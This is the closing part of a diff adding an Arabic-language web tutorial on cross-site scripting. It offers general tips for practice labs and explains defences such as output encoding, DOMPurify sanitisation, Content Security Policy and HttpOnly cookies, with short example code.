+                </a>
+            </div>
+
+            <div class="tip">
+                <h4>💡 نصائح لحل المختبرات</h4>
+                <ul class="list">
+                    <li><strong>استخدم Burp Suite:</strong> لتحليل الطلبات والردود، وتحديد نقاط الإدخال.</li>
+                    <li><strong>فحص كود المصدر:</strong> ابحث عن الأماكن التي يتم فيها دمج إدخال المستخدم في HTML/JavaScript.</li>
+                    <li><strong>جرب Payloads مختلفة:</strong> ابدأ بالأساسية ثم جرب تقنيات التجاوز.</li>
+                    <li><strong>افهم السياق:</strong> أين يتم عرض إدخالك؟ هذا يحدد الـ payload المناسب.</li>
+                    <li><strong>استخدم DevTools:</strong> أدوات المطور في المتصفح مفيدة جداً لتتبع تنفيذ JavaScript ورؤية DOM.</li>
+                </ul>
+            </div>
+        </section>
+
+        <section id="defense">
+            <h2><i class="fas fa-shield-halved"></i> طرق الحماية من XSS</h2>
+            <p>الحماية من XSS تتطلب منهجاً متعدد الطبقات، يركز على تطهير (Sanitization) وتشفير (Encoding) إدخالات المستخدم بشكل صحيح بناءً على السياق، بالإضافة إلى ممارسات أمنية أخرى:</p>
+
+            <div class="grid">
+                <div class="card">
+                    <h3>✅ التشفير (Output Encoding)</h3>
+                    <ul class="list">
+                        <li><strong>القاعدة الذهبية:</strong> لا تثق أبداً بمدخلات المستخدم!</li>
+                        <li><strong>الهدف:</strong> تحويل الأحرف الخاصة إلى كيانات HTML قبل عرضها.</li>
+                        <li><strong>مثال:</strong> <code>&lt;</code> تصبح <code>&amp;lt;</code>.</li>
+                        <li><strong>تطبيق:</strong> استخدم مكتبات التشفير الموثوقة (مثل OWASP ESAPI).</li>
+                    </ul>
+                    <div class="code-block">
+// كود JavaScript (مثال)
+function encodeHTML(str) {
+    return str.replace(/[&<>"']/g, function (match) {
+        return {
+            '&': '&amp;',
+            '<': '&lt;',
+            '>': '&gt;',
+            '"': '&quot;',
+            "'": '&#039;'
+        }[match];
+    });
+}
+document.getElementById('output').innerHTML = encodeHTML(user_input);
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <h3>🗑️ التطهير (Input Sanitization)</h3>
+                    <ul class="list">
+                        <li><strong>الهدف:</strong> إزالة أو تطهير الكود الضار من إدخالات المستخدم.</li>
+                        <li><strong>متى:</strong> عند حفظ البيانات (لـ Stored XSS) أو عند معالجتها (لـ Reflected).</li>
+                        <li><strong>تطبيق:</strong> استخدام مكتبات تطهير قوية (مثل DOMPurify في الواجهة الأمامية، أو Jsoup في الخلفية).</li>
+                    </ul>
+                    <div class="code-block">
+// كود JavaScript (مثال باستخدام DOMPurify)
+import DOMPurify from 'dompurify';
+const cleanHtml = DOMPurify.sanitize(user_input, { USE_PROFILES: { html: true } });
+document.getElementById('output').innerHTML = cleanHtml;
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <h3>🚫 سياسة أمان المحتوى (CSP)</h3>
+                    <ul class="list">
+                        <li><strong>الهدف:</strong> تحديد المصادر الموثوقة التي يمكن للمتصفح تحميل الموارد منها.</li>
+                        <li><strong>الآلية:</strong> HTTP Header يخبر المتصفح من أين يسمح بتحميل JavaScript، CSS، الصور، إلخ.</li>
+                        <li><strong>مثال:</strong> <code>Content-Security-Policy: default-src 'self'</code></li>
+                    </ul>
+                    <div class="code-block">
+# مثال على CSP Header
+Content-Security-Policy: 
+  default-src 'self'; 
+  script-src 'self' https://trusted-cdn.com; 
+  object-src 'none'; 
+  base-uri 'self';
+  
+# هذا يمنع:
+- تنفيذ inline scripts ('unsafe-inline')
+- تحميل scripts من مصادر غير موثوقة
+- استخدام eval() و setTimeout() مع سلاسل نصية ('unsafe-eval')
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <h3>✅ التحقق من الإدخال (Input Validation)</h3>
+                    <ul class="list">
+                        <li><strong>الهدف:</strong> التأكد من أن إدخال المستخدم يطابق التنسيق المتوقع.</li>
+                        <li><strong>مثال:</strong> رقم هاتف يجب أن يكون أرقام فقط.</li>
+                        <li><strong>أين:</strong> على كل من جانب العميل والخادم (الأخير أهم!).</li>
+                    </ul>
+                </div>
+                
+                <div class="card">
+                    <h3>🍪 HttpOnly Cookies</h3>
+                    <ul class="list">
+                        <li><strong>الهدف:</strong> منع JavaScript من الوصول إلى ملفات تعريف الارتباط الحساسة.</li>
+                        <li><strong>الآلية:</strong> تعيين سمة <code>HttpOnly</code> عند إعداد الـ cookie.</li>
+                        <li><strong>النتيجة:</strong> حتى لو تم حقن XSS، لا يمكن للمهاجم سرقة الـ session cookie.</li>
+                    </ul>
+                    <div class="code-block">
+# مثال لتعيين HttpOnly Cookie
+Set-Cookie: JSESSIONID=xyz123; HttpOnly; Secure; SameSite=Lax
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <h3>📦 استخدام Frameworks/Libraries آمنة</h3>
+                    <ul class="list">
+                        <li><strong>الهدف:</strong> الاستفادة من الحماية المدمجة في الأطر الحديثة.</li>
+                        <li><strong>مثال:</strong> React, Angular, Vue تقوم تلقائياً بتشفير (escaping) المحتوى.</li>
+                        <li><strong>ملاحظة:</strong> لا تعني الحماية التامة، يجب الحذر عند استخدام <code>dangerouslySetInnerHTML</code> أو ما يعادله.</li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="warn">
+                <h4>⚠️ لا تعتمد على فلتر واحد!</h4>
+                <p>المهاجمون يجدون طرقاً لتجاوز الفلاتر. أفضل دفاع هو تطبيق دفاع متعدد الطبقات (Defense in Depth):</p>
+                <ul class="list">
+                    <li>تشفير الإخراج (Output Encoding) في كل مكان.</li>
+                    <li>تطهير المدخلات (Input Sanitization) عند الحاجة.</li>
+                    <li>سياسة أمان المحتوى (CSP) قوية.</li>
+                    <li>HttpOnly Cookies لملفات تعريف الارتباط الحساسة.</li>
+                    <li>التحقق الصارم من المدخلات (Input Validation).</li>
+                </ul>
+            </div>
+        </section>
+
+        <section id="summary">
+            <h2><i class="fas fa-list-check"></i> الخلاصة</h2>
+            <p>Cross-site Scripting (XSS) هي ثغرة خطيرة تستهدف المستخدمين عن طريق حقن كود خبيث. فهم أنواعها (Reflected, Stored, DOM-based) وتقنيات استغلالها ضروري. الحماية الفعالة تتطلب تطبيق مبادئ التشفير والتطهير الصارم، بالإضافة إلى استخدام آليات دفاع مثل CSP و HttpOnly Cookies. كن دائماً حذراً من أي إدخال لا يتم تطهيره قبل عرضه!</p>
+        </section>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/prism.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+    <script>
+        mermaid.initialize({
+            startOnLoad: true,
+            theme: 'dark',
+            themeVariables: {
+                primaryColor: '#42a5f5',
+                primaryTextColor: '#e8eaed',
+                primaryBorderColor: '#2d3748',
+                lineColor: '#81c784',
+                secondaryColor: '#1a2332',
+                tertiaryColor: '#0f1724',
+                background: '#1a2332',
+                mainBkg: '#1a2332',
+                secondBkg: '#0f1724',
+                tertiaryBkg: '#2d3748',
+                nodeBorder: '#2d3748',
+                clusterBkg: '#0f1724',
+                clusterBorder: '#2d3748',
+                defaultLinkColor: '#81c784',
+                titleColor: '#e8eaed',
+                edgeLabelBackground: '#1a2332',
+                nodeTextColor: '#e8eaed',
+                // إضافات لضمان الوضوح
+                textColor: '#e8eaed',
+                actorTextColor: '#e8eaed',
+                labelTextColor: '#e8eaed',
+                loopTextColor: '#e8eaed',
+                activationTextColor: '#e8eaed',
+                sectionBkgColor: '#1a2332',
+                altSectionBkgColor: '#0f1724',
+                gridColor: '#2d3748',
+                c0: '#42a5f5',  // Class diagram colors
+                c1: '#81c784',
+                c2: '#ff9800',
+                c3: '#e91e63'
+            }
+        });
+    </script>
+</body>
+</html> 
